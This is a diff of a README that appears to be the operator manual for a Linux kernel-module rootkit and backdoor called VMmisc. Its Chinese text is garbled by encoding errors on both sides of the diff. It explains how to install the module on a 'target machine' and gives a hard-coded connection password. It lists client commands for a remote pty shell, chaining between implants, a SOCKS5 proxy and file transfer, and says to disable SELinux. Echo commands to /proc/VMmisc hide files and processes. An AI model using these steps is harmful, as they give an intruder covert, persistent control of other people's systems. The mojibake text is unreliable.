@@ -1,29 +1,29 @@
 
 
-ËµÃ÷: linux ·þÎñÆô¶¯ÓÐÁ½ÖÖ, Èç¹ûÖ´ÐÐ systemctl ÃüÁî´æÔÚ,
-ÓÃ systemctl.sh °²×°. ²»´æÔÚÊ¹ÓÃ install.sh °²×°.
+è¯´æ˜Ž: linux æœåŠ¡å¯åŠ¨æœ‰ä¸¤ç§, å¦‚æžœæ‰§è¡Œ systemctl å‘½ä»¤å­˜åœ¨,
+ç”¨ systemctl.sh å®‰è£…. ä¸å­˜åœ¨ä½¿ç”¨ install.sh å®‰è£….
 
 
-°²×°:
-°Ñ install ÉÏ´«Ä¿±ê»úÆ÷.
-Ìí¼ÓÖ´ÐÐÈ¨ÏÞ chmod +x install.sh or systemctl.sh
-Ö´ÐÐ install.sh or systemctl.sh Ã»ÓÐ³öÏÖÈÎºÎ´íÎó, ³öÏÖ -- ok -- ÊÇ°²×°³É¹¦
+å®‰è£…:
+æŠŠ install ä¸Šä¼ ç›®æ ‡æœºå™¨.
+æ·»åŠ æ‰§è¡Œæƒé™ chmod +x install.sh or systemctl.sh
+æ‰§è¡Œ install.sh or systemctl.sh æ²¡æœ‰å‡ºçŽ°ä»»ä½•é”™è¯¯, å‡ºçŽ° -- ok -- æ˜¯å®‰è£…æˆåŠŸ
 
-±£´æ´ËÐÅÏ¢,ÓÃÓÚÉ¾³ý.
+ä¿å­˜æ­¤ä¿¡æ¯,ç”¨äºŽåˆ é™¤.
  >> ko path: /xxxx
  >> start path: /xxx
 
-×îºóÉ¾³ý°²×°°ü
+æœ€åŽåˆ é™¤å®‰è£…åŒ…
 
 //-----------------------------------------------------------------------------
 
-Á¬½ÓÃÜÂë: testtest
+è¿žæŽ¥å¯†ç : testtest
 
-Ê¹ÓÃ²Ù×÷:
+ä½¿ç”¨æ“ä½œ:
 Usage: ./client ip port password [http/https/ssh] 
 ./client 127.0.0.1 8080 testtest https
 
-//  ÉÏÏÂ¼ü,²é¿´¼ÇÂ¼
+//  ä¸Šä¸‹é”®,æŸ¥çœ‹è®°å½•
  #> ?
  shell           * start pty shell 
  callrk          [ip:port pass] 
@@ -36,59 +36,59 @@ Usage: ./client ip port password [http/https/ssh]
  exit            exit all 
  
 
-´®Áª:
+ä¸²è”:
  callrk 127.0.0.1:22 pass
  
-ÍË³öµ±Ç°´®Áª:
+é€€å‡ºå½“å‰ä¸²è”:
  exitrk
  
-ÍêÈ«ÍË³ö:
+å®Œå…¨é€€å‡º:
  exit
  
-¿ªÆô´úÀí:
- socks5 5555	// 5555 ±¾µØ¶Ë¿Ú
+å¼€å¯ä»£ç†:
+ socks5 5555	// 5555 æœ¬åœ°ç«¯å£
  
-¹Ø±Õ´úÀí:
+å…³é—­ä»£ç†:
  stopsk5
 
-ÉÏ´«:
+ä¸Šä¼ :
  upload /tmp/6666 /tmp/7777
 
-ÏÂÔØ:
+ä¸‹è½½:
  download /tmp/6666 /tmp/8888
 
 shell:
  shell
  
-ÍË³ö shell:
+é€€å‡º shell:
  exit
 
-shell Ê±, ÏµÍ³ÔÚ¿ªÆô selinux Ê±, Ö´ÐÐ systemctl ÃüÁî,ÓÐÈ¨ÏÞ¼ì²é. 
-ÐèÒªÏÈÁÙÊ±¹Ø±Õ selinux 
-Ö´ÐÐ: setenforce 0 (¹Ø±Õ)	setenforce 1 (¿ªÆô)
+shell æ—¶, ç³»ç»Ÿåœ¨å¼€å¯ selinux æ—¶, æ‰§è¡Œ systemctl å‘½ä»¤,æœ‰æƒé™æ£€æŸ¥. 
+éœ€è¦å…ˆä¸´æ—¶å…³é—­ selinux 
+æ‰§è¡Œ: setenforce 0 (å…³é—­)	setenforce 1 (å¼€å¯)
 
 //-----------------------------------------------------------------------------
-// Òþ²ØÎÄ¼þ/Ä¿Â¼ 222
+// éšè—æ–‡ä»¶/ç›®å½• 222
  echo "+f222" > /proc/VMmisc
-// ÏÔÊ¾ÎÄ¼þ 222
+// æ˜¾ç¤ºæ–‡ä»¶ 222
  echo "-f222" > /proc/VMmisc
 
 
-// Òþ²Ø pid 666
+// éšè— pid 666
  echo "+p666" > /proc/VMmisc
-// ÏÔÊ¾ pid 666
+// æ˜¾ç¤º pid 666
  echo "-p666" > /proc/VMmisc
 
 
 //----------------------------------------------------------------------
-É¾³ýÎÄ¼þ
+åˆ é™¤æ–‡ä»¶
 
-// °²×°Ê± ±£ÁôµÄÂ·¾¶
+// å®‰è£…æ—¶ ä¿ç•™çš„è·¯å¾„
  >> ko path: /etc/cc87f4d8
  >> start path: /etc/init.d/cc87f4d8
 
 // 1. 
-// ¹Ø±Õ ko Òþ²Ø
+// å…³é—­ ko éšè—
  echo "dm" > /proc/VMmisc
  rmmod VMmisc.ko 
 
@@ -97,7 +97,7 @@ shell Ê±, ÏµÍ³ÔÚ¿ªÆô selinux Ê±, Ö´ÐÐ systemctl ÃüÁî,ÓÐÈ¨ÏÞ¼ì²é.
 
 
 // 2. systemctl
-// ¹Ø±Õ ko Òþ²Ø
+// å…³é—­ ko éšè—
  echo "dm" > /proc/VMmisc
  rmmod VMmisc.ko 
 
